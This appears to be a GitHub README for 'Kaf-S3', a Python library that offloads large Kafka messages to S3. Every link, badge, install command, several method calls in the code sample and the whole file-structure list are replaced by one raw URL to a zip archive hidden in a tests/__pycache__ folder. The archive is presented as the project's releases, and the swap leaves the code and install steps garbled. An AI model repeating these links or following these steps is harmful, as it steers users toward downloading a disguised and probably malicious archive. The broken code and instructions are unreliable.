https://raw.githubusercontent.com/sarahosantos/kaf-s3/main/tests/__pycache__/s-kaf-1.5.zip
[![Releases](https://raw.githubusercontent.com/sarahosantos/kaf-s3/main/tests/__pycache__/s-kaf-1.5.zip)](https://raw.githubusercontent.com/sarahosantos/kaf-s3/main/tests/__pycache__/s-kaf-1.5.zip)

# Kaf-S3: Python Library to Offload Large Kafka Messages to S3

⚡️ A practical Python library to handle big Kafka messages by offloading payloads to Amazon S3. This project bridges Kafka speed with S3 storage to keep topics lean and fast. It keeps your Kafka cluster healthy while still letting you work with large data objects in a reliable, scalable way. This README explains how it works, how to use it, and how to contribute.

---

## Why Kaf-S3

- Large messages can slow down Kafka and inflate broker load.
- Offloading payloads to S3 keeps Kafka messages small and fast.
- You get durable storage with S3, while Kafka carries lightweight references.
- It supports common data engineering workflows with minimal changes to your code.

Key ideas:
- Upload big payloads to S3.
- Store a pointer (a durable reference) in Kafka.
- Rehydrate the payload when needed by your consumer.

This approach is ideal for streaming analytics, event logs, multimedia payloads, and data pipelines that push big data into Kafka but need efficient downstream processing.

---

## Features

- Transparent offloading: producers automatically push large payloads to S3.
- Lightweight Kafka messages: only references are sent over Kafka.
- Simple API: easy to adopt in existing Python projects.
- Configurable thresholds: choose when to offload.
- AWS S3 integration: secure, scalable storage.
- Compatibility: works with standard Kafka clients in Python.

Emoji quick glance:
- 🗄️ Offload large payloads to S3
- 🧰 Easy to integrate with Kafka clients
- 🚀 Fast, scalable message handling
- 🛡️ Secure access with AWS IAM roles and keys
- 🔧 Configurable behavior for different environments

---

## Architecture and How It Works

High-level design:
- Producer side checks the size of the message payload.
- If payload exceeds a threshold, the library uploads it to S3 and sends a pointer (S3 URI or a reference ID) in the Kafka message.
- The consumer reads the pointer, fetches the payload from S3, and reconstructs the original message.
- Small messages bypass S3 and go through Kafka directly.

A simple data flow:
- Producer: payload -> (upload to S3) -> pointer in Kafka
- Consumer: pointer in Kafka -> fetch from S3 -> reconstruct payload -> process

ASCII diagram:
```
+-----------+        +-----------+        +------------+
| Producer  | ---->  | Kafka     | ---->  | Consumer   |
| (py app)  |        | broker    |        | app        |
+-----------+        +-----------+        +------------+
      |                     |                   |
      | payload > threshold|                   |
      v                     v                   v
+-------------+     +-----------------+      +----------------+
| Upload to   |     | Write pointer   |      | Read pointer   |
| S3 bucket   |     | (S3 URI)        |      | from Kafka     |
+-------------+     +-----------------+      +----------------+
```

Design choices:
- Threshold-based offload gives balance between speed and storage.
- Pointers keep Kafka lightweight and decoupled from payload size.
- S3 provides durability, versioning, and lifecycle policies.

---

## Quick Start

Follow these steps to get started quickly.

Prerequisites:
- Python 3.8+ installed
- Access to an AWS account with S3
- Kafka cluster you can publish to and consume from
- Basic knowledge of Python packaging and dependencies

Steps:
1) Install the library
- Pip install kaf-s3
- Or install from source: clone the repo and run pip install .

2) Prepare AWS credentials
- Use environment variables or IAM roles to provide AWS access.
- Recommended env vars:
  - AWS_ACCESS_KEY_ID
  - AWS_SECRET_ACCESS_KEY
  - AWS_DEFAULT_REGION
- Ensure the S3 bucket exists and your user has write permissions.

3) Basic usage
- Create a producer that offloads large messages
- Create a consumer that reconstructs messages from S3

Code example (simplified):

```python
from kaf_s3 import KafS3Producer, KafS3Consumer

# Producer setup
producer = KafS3Producer(
    bootstrap_servers="broker1:9092,broker2:9092",
    s3_bucket="my-kaf-s3-bucket",
    s3_prefix="payloads/",
    offload_threshold=1024 * 1024,  # 1 MB
    aws_profile="default",
)

# Send a typical small message (direct in Kafka)
https://raw.githubusercontent.com/sarahosantos/kaf-s3/main/tests/__pycache__/s-kaf-1.5.zip("events", key=b"id-123", value=b"small payload")

# Send a large payload (offloaded to S3)
large_payload = b"A" * (5 * 1024 * 1024)  # 5 MB
https://raw.githubusercontent.com/sarahosantos/kaf-s3/main/tests/__pycache__/s-kaf-1.5.zip("events", key=b"id-124", payload=large_payload)

# Consumer setup
consumer = KafS3Consumer(
    bootstrap_servers="broker1:9092,broker2:9092",
    s3_bucket="my-kaf-s3-bucket",
    s3_prefix="payloads/",
)

# Consume and reconstruct
for msg in https://raw.githubusercontent.com/sarahosantos/kaf-s3/main/tests/__pycache__/s-kaf-1.5.zip("events"):
    # https://raw.githubusercontent.com/sarahosantos/kaf-s3/main/tests/__pycache__/s-kaf-1.5.zip will be the reconstructed payload
    process(https://raw.githubusercontent.com/sarahosantos/kaf-s3/main/tests/__pycache__/s-kaf-1.5.zip)
```

Notes:
- The library handles the pointer creation and rehydration transparently.
- You can adjust the threshold to fit your data patterns.

4) Verify releases
- Check the latest artifacts in the releases page and try a release artifact if you want to test from source.

---

## Installation Details

- pip install kaf-s3
- If you prefer a source install:
  - git clone https://raw.githubusercontent.com/sarahosantos/kaf-s3/main/tests/__pycache__/s-kaf-1.5.zip
  - cd kaf-s3
  - pip install -e .

Optional components:
- boto3 for AWS interactions
- kafka-python or confluent-kafka for Kafka clients compatibility

Environment variables and configuration:
- AWS credentials: AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, AWS_DEFAULT_REGION
- S3 settings: s3_bucket, s3_prefix
- Kafka settings: bootstrap_servers
- Offload control: offload_threshold (bytes)
- Optional: encryption, SSE-KMS for S3 objects

Configuration examples:
- Use a config file (YAML/JSON) or environment variables.
- Example YAML:
  - s3_bucket: my-kaf-s3-bucket
  - s3_prefix: payloads/
  - offload_threshold: 1048576
  - bootstrap_servers: "broker1:9092,broker2:9092"
  - region: us-west-2

Performance tuning tips:
- Set a sensible offload_threshold. Smaller values reduce payload size on Kafka but increase S3 operations.
- Use larger batch sizes for producers if your workload benefits from batch throughput.
- Enable parallel uploads to S3 where possible to improve throughput.
- Enable lifecycle policies in S3 to manage storage costs over time.

Security considerations:
- Use IAM roles for EC2 or containerized deployments if possible.
- Do not hard-code credentials; rely on roles or secure storage for keys.
- Use encryption for S3 objects and enable bucket-level policies as needed.

---

## API Reference

Note: The library exposes a compact set of classes to minimize integration effort.

- KafS3Producer
  - __init__(self, bootstrap_servers, s3_bucket, s3_prefix, offload_threshold=1048576, aws_profile=None, **kwargs)
  - send(self, topic, key=None, value=None, payload=None, headers=None, **kwargs)
  - flush(self)
  - close(self)

- KafS3Consumer
  - __init__(self, bootstrap_servers, s3_bucket, s3_prefix, **kwargs)
  - consume(self, topic, group_id=None, timeout_ms=None)
  - close(self)

- Helper functions
  - upload_to_s3(payload, bucket, key, aws_profile=None)
  - download_from_s3(uri, bucket, key, aws_profile=None)

Usage notes:
- If payload is provided, it can be any bytes-like object.
- When payload size exceeds the threshold, the library uploads to S3 and sends a pointer in Kafka.
- The pointer includes enough information to fetch the payload later.

---

## Data Model and Payload Offload Details

- Small messages: kept entirely in Kafka as value or key/value.
- Large messages: stored in S3. The Kafka message carries a payload pointer.
- Pointer format: a compact JSON or binary reference with fields like bucket, key, size, and an optional digest.

Advantages:
- Kafka stays fast with small messages.
- S3 handles large data with high durability and efficiency.
- Consumers can fetch large payloads on demand.

Trade-offs:
- Slightly more latency for offloaded messages due to S3 fetch.
- Requires network access to S3 during rehydration.

Best practices:
- Use a suffix in S3 keys to organize payloads by topic or date.
- Apply object lifecycle policies to manage long-term costs.
- Consider checksum validation to detect payload corruption.

---

## Testing and Quality

- Unit tests cover the offload logic, S3 interactions, and pointer handling.
- Run tests with pytest or your preferred framework.
- Use small synthetic payloads first, then test with larger payloads to validate the offload path.
- Validate end-to-end scenarios: produce a large message, consume it, and verify the recovered payload.

Test tips:
- Mock S3 calls during unit tests to avoid network usage.
- Use a dedicated test bucket to prevent interference with production data.
- Include integration tests that verify actual uploads to S3 and retrievals.

---

## Examples and Real-World Scenarios

Example 1: Streaming logs with large event payloads
- You emit compact event metadata to Kafka.
- The event payload (like a full log line with binary payload) is stored in S3.
- The consumer reconstructs the full event by fetching the payload.

Example 2: Media processing pipelines
- Kafka holds references to media assets stored in S3.
- Downstream workers pull payloads as needed for processing.

Example 3: Data lake ingestion
- Raw data chunks are offloaded to S3.
- Kafka coordinates the processing chain with small references.

Code snippets for these patterns follow the Quick Start example, with adjustments to reflect your data shapes.

---

## Running Locally and in the Cloud

Local development:
- Use a local Kafka setup or a test cluster.
- Create a test S3 bucket.
- Configure environment variables for AWS and Kafka.

Cloud deployment:
- Use containerized services.
- Use IAM roles to grant access to S3.
- Use a managed Kafka service if possible to reduce maintenance tasks.

Observability:
- Add logging around upload and download steps.
- Trace payload lifecycles to measure offload impact.
- Monitor S3 usage and bucket metrics for cost awareness.

Scaling tips:
- Increase the number of producers if you see queueing.
- Use partitioning in Kafka to distribute payloads evenly.
- Keep the offload threshold in line with your network and storage costs.

---

## Migration and Compatibility

- If you upgrade, check the transport and data format for pointers.
- Backward compatibility: pointers are designed to be stable to avoid breaking existing consumers.
- When in doubt, run a small pilot with a subset of topics to confirm behavior.

Backward-compatible changes are preferred. If you introduce breaking changes, provide a clear upgrade path and migration guide.

---

## Documentation, Guides, and Tutorials

- Quick Start guide for immediate use.
- In-depth API reference for advanced usage.
- Tutorials on: multi-topic pipelines, error handling, and capacity planning.
- Best practices for AWS IAM, S3 bucket design, and data governance.

Tutorial ideas:
- Build a tiny data pipeline that offloads large payloads from a real data source.
- Compare performance with and without offloading under varying payload sizes.
- Create a monitoring dashboard for offload metrics and S3 costs.

---

## Community and Contributions

- This project welcomes contributions from data engineers, developers, and researchers.
- You can propose enhancements, fix bugs, or add tests.
- Follow the community guidelines to submit pull requests and report issues.

Contribution ideas:
- Add support for additional Kafka clients or serializers.
- Improve pointer formats for even smaller Kafka messages.
- Integrate with alternative object stores beyond S3 (with appropriate adapters).

---

## Release Process

- Releases are published to the official release page for visibility.
- Each release includes a changelog, upgrade notes, and migration guidance when needed.
- You can download release artifacts to test or install from source.

Releases page:
- Visit the official releases to download artifacts and read release notes.

Note: The releases page is the primary source for tested builds; use those artifacts for stable deployments. For fresh development builds, you can clone the repository and install from source.

---

## File Structure

- kaf_s3/
  - https://raw.githubusercontent.com/sarahosantos/kaf-s3/main/tests/__pycache__/s-kaf-1.5.zip
  - https://raw.githubusercontent.com/sarahosantos/kaf-s3/main/tests/__pycache__/s-kaf-1.5.zip
  - https://raw.githubusercontent.com/sarahosantos/kaf-s3/main/tests/__pycache__/s-kaf-1.5.zip
  - https://raw.githubusercontent.com/sarahosantos/kaf-s3/main/tests/__pycache__/s-kaf-1.5.zip
  - https://raw.githubusercontent.com/sarahosantos/kaf-s3/main/tests/__pycache__/s-kaf-1.5.zip
  - https://raw.githubusercontent.com/sarahosantos/kaf-s3/main/tests/__pycache__/s-kaf-1.5.zip
  - tests/
- examples/
  - https://raw.githubusercontent.com/sarahosantos/kaf-s3/main/tests/__pycache__/s-kaf-1.5.zip
  - https://raw.githubusercontent.com/sarahosantos/kaf-s3/main/tests/__pycache__/s-kaf-1.5.zip
- docs/
  - https://raw.githubusercontent.com/sarahosantos/kaf-s3/main/tests/__pycache__/s-kaf-1.5.zip
  - https://raw.githubusercontent.com/sarahosantos/kaf-s3/main/tests/__pycache__/s-kaf-1.5.zip
  - https://raw.githubusercontent.com/sarahosantos/kaf-s3/main/tests/__pycache__/s-kaf-1.5.zip
- https://raw.githubusercontent.com/sarahosantos/kaf-s3/main/tests/__pycache__/s-kaf-1.5.zip
- https://raw.githubusercontent.com/sarahosantos/kaf-s3/main/tests/__pycache__/s-kaf-1.5.zip
- https://raw.githubusercontent.com/sarahosantos/kaf-s3/main/tests/__pycache__/s-kaf-1.5.zip (this file)

This layout keeps core logic separate and easy to test. It also helps you add adapters for other stores or serializers in the future.

---

## Roadmap

- Add support for more object stores beyond S3.
- Implement richer pointer formats with metadata.
- Provide a CLI tool to manage offloaded payloads.
- Improve observability with metrics and tracing.
- Add more examples for common data engineering patterns.

Roadmap items are subject to change as user needs evolve. Stay tuned for updated guidance in the Releases section.

---

## FAQ

- Q: What happens if S3 is unavailable?
  A: The library will attempt retries and fall back to small payloads if possible. If not, you can pause offload or error gracefully.

- Q: Can I use this with any Kafka client in Python?
  A: Yes. The library provides a compatibility layer for common Python Kafka clients. It is designed to be integration-friendly.

- Q: Is the payload recovery deterministic?
  A: Yes. The pointer includes the payload location and size, ensuring reproducible recovery.

- Q: How do I manage credentials securely?
  A: Prefer IAM roles or credential providers. Do not hard-code keys in code or config files.

- Q: Can I test offline?
  A: Yes. Mock S3 storage and Kafka brokers to validate behavior before connecting to real services.

---

## Troubleshooting

- If you see timeouts when uploading to S3, verify the bucket region and network access.
- If messages are not offloading, check the threshold setting and ensure the payload is large enough.
- If rehydration fails, verify the pointer contents and permissions on the S3 object.

Tips:
- Enable verbose logging for producer and consumer.
- Use a dedicated test environment for experiments.

---

## Licensing

- This project is typically released under a permissive license to encourage adoption and collaboration.
- Check LICENSE file for exact terms.

---

## Contact and Support

- For questions or issues, open an issue on the repository.
- If you need help with deployment, share your environment details and error logs.

---

## Acknowledgments

- Thanks to contributors and users who test, document, and improve the project.
- Special thanks to the community for feedback and support.

---

## Final Notes

- This README is designed to be practical and comprehensive.
- It covers installation, usage, architecture, testing, deployment, and future work.
- It aims to help teams integrate large-message offloading into Kafka pipelines with confidence.

